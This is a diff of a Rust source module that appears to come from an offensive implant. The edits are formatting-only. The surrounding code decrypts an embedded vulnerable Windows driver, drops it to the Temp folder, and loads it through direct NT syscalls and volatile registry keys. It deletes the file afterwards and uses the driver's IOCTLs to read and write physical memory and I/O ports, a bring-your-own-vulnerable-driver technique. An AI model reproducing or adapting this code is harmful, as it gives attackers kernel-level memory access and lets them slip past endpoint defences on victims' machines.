@@ -11,8 +11,8 @@
 
 use super::driver_db::{self, DriverMapping, VulnerableDriver};
 use anyhow::{bail, Context, Result};
-use std::sync::Mutex;
 use once_cell::sync::Lazy;
+use std::sync::Mutex;
 
 /// XOR key placeholder for driver resource decryption.
 /// In production, this is derived from the agent's HKDF session key.
@@ -218,10 +218,7 @@ pub fn scan_for_loaded_driver(preferred: &[String]) -> Result<Option<&'static Vu
             for driver_name in &filter {
                 if module_name.eq_ignore_ascii_case(driver_name) {
                     if let Some(driver) = driver_db::find_driver(driver_name) {
-                        log::info!(
-                            "Found already-loaded vulnerable driver: {}",
-                            driver.name
-                        );
+                        log::info!("Found already-loaded vulnerable driver: {}", driver.name);
                         return Ok(Some(driver));
                     }
                 }
@@ -295,14 +292,10 @@ pub fn deploy_embedded_driver(
         service_prefix.trim_end_matches('\0'),
         crate::common_short_id()
     );
-    let temp_path = format!(
-        "C:\\Windows\\Temp\\{}.sys",
-        service_name
-    );
+    let temp_path = format!("C:\\Windows\\Temp\\{}.sys", service_name);
 
     // Write the driver to disk.
-    write_driver_to_disk(&temp_path, &decrypted)
-        .context("failed to write driver to disk")?;
+    write_driver_to_disk(&temp_path, &decrypted).context("failed to write driver to disk")?;
 
     // Load the driver via NtLoadDriver and open the device handle.
     // load_driver_via_registry now returns the device handle directly.
@@ -437,17 +430,17 @@ fn write_driver_to_disk(path: &str, data: &[u8]) -> Result<()> {
     let status = ntstatus_or_default(unsafe {
         crate::syscall!(
             "NtCreateFile",
-            &mut handle as *mut usize as u64,       // 1
-            0x40000000u64,                           // 2 — GENERIC_WRITE
-            &mut oa as *mut _ as u64,                // 3
-            &mut iosb as *mut _ as u64,              // 4
-            0u64,                                    // 5 — AllocationSize (NULL)
-            0x80u64,                                 // 6 — FILE_ATTRIBUTE_NORMAL
-            0u64,                                    // 7 — ShareAccess (exclusive)
-            2u64,                                    // 8 — FILE_OVERWRITE_IF
-            0x20u64,                                 // 9 — FILE_SYNCHRONOUS_IO_NONALERT
-            0u64,                                    // 10 — EaBuffer
-            0u64                                     // 11 — EaLength
+            &mut handle as *mut usize as u64, // 1
+            0x40000000u64,                    // 2 — GENERIC_WRITE
+            &mut oa as *mut _ as u64,         // 3
+            &mut iosb as *mut _ as u64,       // 4
+            0u64,                             // 5 — AllocationSize (NULL)
+            0x80u64,                          // 6 — FILE_ATTRIBUTE_NORMAL
+            0u64,                             // 7 — ShareAccess (exclusive)
+            2u64,                             // 8 — FILE_OVERWRITE_IF
+            0x20u64,                          // 9 — FILE_SYNCHRONOUS_IO_NONALERT
+            0u64,                             // 10 — EaBuffer
+            0u64                              // 11 — EaLength
         )
     });
 
@@ -460,15 +453,15 @@ fn write_driver_to_disk(path: &str, data: &[u8]) -> Result<()> {
     let status = ntstatus_or_default(unsafe {
         crate::syscall!(
             "NtWriteFile",
-            handle as u64,                           // FileHandle
-            0u64,                                    // Event
-            0u64,                                    // ApcRoutine
-            0u64,                                    // ApcContext
-            &mut write_iosb as *mut _ as u64,        // IoStatusBlock
-            data.as_ptr() as u64,                    // Buffer
-            data.len() as u64,                       // Length
-            std::ptr::null::<u64>() as u64,          // ByteOffset (NULL = current)
-            0u64                                     // Key
+            handle as u64,                    // FileHandle
+            0u64,                             // Event
+            0u64,                             // ApcRoutine
+            0u64,                             // ApcContext
+            &mut write_iosb as *mut _ as u64, // IoStatusBlock
+            data.as_ptr() as u64,             // Buffer
+            data.len() as u64,                // Length
+            std::ptr::null::<u64>() as u64,   // ByteOffset (NULL = current)
+            0u64                              // Key
         )
     });
 
@@ -512,9 +505,9 @@ fn load_driver_via_registry(
             &mut key_handle as *mut usize as u64,
             0x00020006u64, // KEY_WRITE | KEY_SET_VALUE | KEY_CREATE_SUB_KEY
             &mut oa as *mut _ as u64,
-            0u64, // TitleIndex
+            0u64,                           // TitleIndex
             std::ptr::null::<u64>() as u64, // Class (NULL)
-            1u64, // CreateOptions = REG_OPTION_VOLATILE
+            1u64,                           // CreateOptions = REG_OPTION_VOLATILE
             &mut disp as *mut u32 as u64
         )
     });
@@ -541,10 +534,7 @@ fn load_driver_via_registry(
     let mut load_uni = make_unicode_string(&mut load_path_wide);
 
     let status = ntstatus_or_default(unsafe {
-        crate::syscall!(
-            "NtLoadDriver",
-            &mut load_uni as *mut _ as u64
-        )
+        crate::syscall!("NtLoadDriver", &mut load_uni as *mut _ as u64)
     });
 
     // Close the registry key.
@@ -564,7 +554,10 @@ fn load_driver_via_registry(
 
 /// Set a DWORD registry value via NtSetValueKey.
 fn set_registry_dword(key_handle: usize, value_name: &str, value: u32) -> Result<()> {
-    let mut name_wide: Vec<u16> = value_name.encode_utf16().chain(std::iter::once(0)).collect();
+    let mut name_wide: Vec<u16> = value_name
+        .encode_utf16()
+        .chain(std::iter::once(0))
+        .collect();
     let mut uni_name = make_unicode_string(&mut name_wide);
 
     let status = ntstatus_or_default(unsafe {
@@ -572,19 +565,15 @@ fn set_registry_dword(key_handle: usize, value_name: &str, value: u32) -> Result
             "NtSetValueKey",
             key_handle as u64,
             &mut uni_name as *mut _ as u64,
-            0u64,   // TitleIndex
-            4u64,   // REG_DWORD
+            0u64, // TitleIndex
+            4u64, // REG_DWORD
             &value as *const u32 as u64,
-            4u64    // DataSize
+            4u64 // DataSize
         )
     });
 
     if status != 0 {
-        bail!(
-            "NtSetValueKey({}) failed: 0x{:08X}",
-            value_name,
-            status
-        );
+        bail!("NtSetValueKey({}) failed: 0x{:08X}", value_name, status);
     }
 
     Ok(())
@@ -592,7 +581,10 @@ fn set_registry_dword(key_handle: usize, value_name: &str, value: u32) -> Result
 
 /// Set a string registry value via NtSetValueKey.
 fn set_registry_string(key_handle: usize, value_name: &str, value: &str) -> Result<()> {
-    let mut name_wide: Vec<u16> = value_name.encode_utf16().chain(std::iter::once(0)).collect();
+    let mut name_wide: Vec<u16> = value_name
+        .encode_utf16()
+        .chain(std::iter::once(0))
+        .collect();
     let mut uni_name = make_unicode_string(&mut name_wide);
     let mut value_wide: Vec<u16> = value.encode_utf16().collect();
     let data_size = value_wide.len() as u64 * 2 + 2; // Include null terminator
@@ -602,19 +594,15 @@ fn set_registry_string(key_handle: usize, value_name: &str, value: &str) -> Resu
             "NtSetValueKey",
             key_handle as u64,
             &mut uni_name as *mut _ as u64,
-            0u64,   // TitleIndex
-            1u64,   // REG_SZ
+            0u64, // TitleIndex
+            1u64, // REG_SZ
             value_wide.as_mut_ptr() as u64,
             data_size
         )
     });
 
     if status != 0 {
-        bail!(
-            "NtSetValueKey({}) failed: 0x{:08X}",
-            value_name,
-            status
-        );
+        bail!("NtSetValueKey({}) failed: 0x{:08X}", value_name, status);
     }
 
     Ok(())
@@ -654,12 +642,8 @@ fn delete_file_from_disk(path: &str) -> Result<()> {
     let mut uni_name = make_unicode_string(&mut wide_path);
     let mut oa = ObjectAttributes::new(&mut uni_name);
 
-    let status = ntstatus_or_default(unsafe {
-        crate::syscall!(
-            "NtDeleteFile",
-            &mut oa as *mut _ as u64
-        )
-    });
+    let status =
+        ntstatus_or_default(unsafe { crate::syscall!("NtDeleteFile", &mut oa as *mut _ as u64) });
 
     if status != 0 {
         // Non-fatal: the driver is already loaded in kernel memory.
@@ -678,7 +662,10 @@ fn open_driver_device(driver: &VulnerableDriver) -> Result<usize> {
     // Build the device path using the driver's canonical device name.
     // Vulnerable drivers create a device symlink under \??\<device_name>.
     let device_path = format!("\\??\\{}", driver.device_name);
-    let mut wide_path: Vec<u16> = device_path.encode_utf16().chain(std::iter::once(0)).collect();
+    let mut wide_path: Vec<u16> = device_path
+        .encode_utf16()
+        .chain(std::iter::once(0))
+        .collect();
     let mut uni_name = make_unicode_string(&mut wide_path);
     let mut oa = ObjectAttributes::new(&mut uni_name);
     let mut iosb = IoStatusBlock::default();
@@ -741,16 +728,16 @@ pub unsafe fn read_physical_memory(
             // )
             let status = ntstatus_or_default(crate::syscall!(
                 "NtDeviceIoControlFile",
-                device_handle as u64,                      // 1
-                0u64,                                      // 2 — Event
-                0u64,                                      // 3 — ApcRoutine
-                0u64,                                      // 4 — ApcContext
-                &mut iosb as *mut _ as u64,                // 5 — IoStatusBlock
-                driver.read_ioctl as u64,                  // 6
-                input.as_ptr() as u64,                     // 7
-                input.len() as u64,                        // 8
-                buffer.as_mut_ptr() as u64,                // 9
-                buffer.len() as u64                        // 10
+                device_handle as u64,       // 1
+                0u64,                       // 2 — Event
+                0u64,                       // 3 — ApcRoutine
+                0u64,                       // 4 — ApcContext
+                &mut iosb as *mut _ as u64, // 5 — IoStatusBlock
+                driver.read_ioctl as u64,   // 6
+                input.as_ptr() as u64,      // 7
+                input.len() as u64,         // 8
+                buffer.as_mut_ptr() as u64, // 9
+                buffer.len() as u64         // 10
             ));
 
             if status != 0 {
@@ -776,7 +763,9 @@ pub unsafe fn read_physical_memory(
             let status = ntstatus_or_default(crate::syscall!(
                 "NtDeviceIoControlFile",
                 device_handle as u64,
-                0u64, 0u64, 0u64,
+                0u64,
+                0u64,
+                0u64,
                 &mut iosb as *mut _ as u64,
                 driver.read_ioctl as u64,
                 input.as_ptr() as u64,
@@ -787,7 +776,8 @@ pub unsafe fn read_physical_memory(
             if status != 0 {
                 bail!(
                     "MMIO read failed at 0x{:016X}: 0x{:08X}",
-                    physical_address, status
+                    physical_address,
+                    status
                 );
             }
             Ok(())
@@ -797,13 +787,15 @@ pub unsafe fn read_physical_memory(
             // The IOCTL input is: [port: u16, count: u32].
             let mut input = [0u8; 8];
             input[0..2].copy_from_slice(&(physical_address as u16).to_le_bytes()); // port
-            input[2..6].copy_from_slice(&(buffer.len() as u32).to_le_bytes());     // count
+            input[2..6].copy_from_slice(&(buffer.len() as u32).to_le_bytes()); // count
 
             let mut iosb = IoStatusBlock::default();
             let status = ntstatus_or_default(crate::syscall!(
                 "NtDeviceIoControlFile",
                 device_handle as u64,
-                0u64, 0u64, 0u64,
+                0u64,
+                0u64,
+                0u64,
                 &mut iosb as *mut _ as u64,
                 driver.read_ioctl as u64,
                 input.as_ptr() as u64,
@@ -814,7 +806,8 @@ pub unsafe fn read_physical_memory(
             if status != 0 {
                 bail!(
                     "PortIO read failed at port 0x{:04X}: 0x{:08X}",
-                    physical_address as u16, status
+                    physical_address as u16,
+                    status
                 );
             }
             Ok(())
@@ -845,16 +838,16 @@ pub unsafe fn write_physical_memory(
 
             let status = ntstatus_or_default(crate::syscall!(
                 "NtDeviceIoControlFile",
-                device_handle as u64,                      // 1
-                0u64,                                      // 2 — Event
-                0u64,                                      // 3 — ApcRoutine
-                0u64,                                      // 4 — ApcContext
-                &mut iosb as *mut _ as u64,                // 5 — IoStatusBlock
-                driver.write_ioctl as u64,                 // 6
-                input.as_ptr() as u64,                     // 7
-                input.len() as u64,                        // 8
-                0u64,                                      // 9 — OutputBuffer
-                0u64                                       // 10 — OutputLength
+                device_handle as u64,       // 1
+                0u64,                       // 2 — Event
+                0u64,                       // 3 — ApcRoutine
+                0u64,                       // 4 — ApcContext
+                &mut iosb as *mut _ as u64, // 5 — IoStatusBlock
+                driver.write_ioctl as u64,  // 6
+                input.as_ptr() as u64,      // 7
+                input.len() as u64,         // 8
+                0u64,                       // 9 — OutputBuffer
+                0u64                        // 10 — OutputLength
             ));
 
             if status != 0 {
@@ -879,17 +872,21 @@ pub unsafe fn write_physical_memory(
             let status = ntstatus_or_default(crate::syscall!(
                 "NtDeviceIoControlFile",
                 device_handle as u64,
-                0u64, 0u64, 0u64,
+                0u64,
+                0u64,
+                0u64,
                 &mut iosb as *mut _ as u64,
                 driver.write_ioctl as u64,
                 input.as_ptr() as u64,
                 input.len() as u64,
-                0u64, 0u64
+                0u64,
+                0u64
             ));
             if status != 0 {
                 bail!(
                     "MMIO write failed at 0x{:016X}: 0x{:08X}",
-                    physical_address, status
+                    physical_address,
+                    status
                 );
             }
             Ok(())
@@ -899,24 +896,28 @@ pub unsafe fn write_physical_memory(
             // buffer (some drivers use the output buffer for write data).
             let mut input = vec![0u8; 8 + data.len()];
             input[0..2].copy_from_slice(&(physical_address as u16).to_le_bytes()); // port
-            input[2..6].copy_from_slice(&(data.len() as u32).to_le_bytes());     // count
+            input[2..6].copy_from_slice(&(data.len() as u32).to_le_bytes()); // count
             input[8..].copy_from_slice(data);
 
             let mut iosb = IoStatusBlock::default();
             let status = ntstatus_or_default(crate::syscall!(
                 "NtDeviceIoControlFile",
                 device_handle as u64,
-                0u64, 0u64, 0u64,
+                0u64,
+                0u64,
+                0u64,
                 &mut iosb as *mut _ as u64,
                 driver.write_ioctl as u64,
                 input.as_ptr() as u64,
                 input.len() as u64,
-                0u64, 0u64
+                0u64,
+                0u64
             ));
             if status != 0 {
                 bail!(
                     "PortIO write failed at port 0x{:04X}: 0x{:08X}",
-                    physical_address as u16, status
+                    physical_address as u16,
+                    status
                 );
             }
             Ok(())
@@ -1056,10 +1057,7 @@ pub fn deploy(preferred: &[String], session_key: &[u8]) -> Result<DeployedDriver
             *guard = Some(deployed);
         }
 
-        log::info!(
-            "Using pre-loaded vulnerable driver: {}",
-            driver.name
-        );
+        log::info!("Using pre-loaded vulnerable driver: {}", driver.name);
 
         // Read back from global state for the return value.
         let guard = DEPLOYED.lock().unwrap();
@@ -1088,15 +1086,14 @@ pub fn deploy(preferred: &[String], session_key: &[u8]) -> Result<DeployedDriver
         match deploy_embedded_driver(driver, session_key) {
             Ok(deployed) => return Ok(deployed),
             Err(e) => {
-                log::warn!(
-                    "Failed to deploy embedded driver {}: {}",
-                    driver.name,
-                    e
-                );
+                log::warn!("Failed to deploy embedded driver {}: {}", driver.name, e);
                 continue;
             }
         }
     }
 
-    bail!("No vulnerable driver could be deployed (tried {} embedded, scanned for pre-loaded)", embedded.len());
+    bail!(
+        "No vulnerable driver could be deployed (tried {} embedded, scanned for pre-loaded)",
+        embedded.len()
+    );
 }
